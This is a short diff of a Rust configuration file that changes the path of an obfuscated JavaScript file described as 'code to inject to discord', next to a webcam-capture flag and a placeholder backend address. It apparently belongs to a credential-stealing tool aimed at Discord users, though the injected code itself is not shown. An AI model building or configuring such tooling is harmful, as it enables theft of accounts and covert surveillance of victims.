@@ -47,4 +47,4 @@ pub const WEBCAM_IMAGE: bool = false;
 pub const BACKEND: &'static str = "[ENTER-BACKEND]";
 
 // Code to inject to discord (obfuscated with https://www.preemptive.com/products/jsdefender/online-javascript-obfuscator-demo/)
-pub const INJECT_CODE: &'static str = include_str!("../assets/inject.js");
+pub const INJECT_CODE: &'static str = include_str!("../res/inject.js");
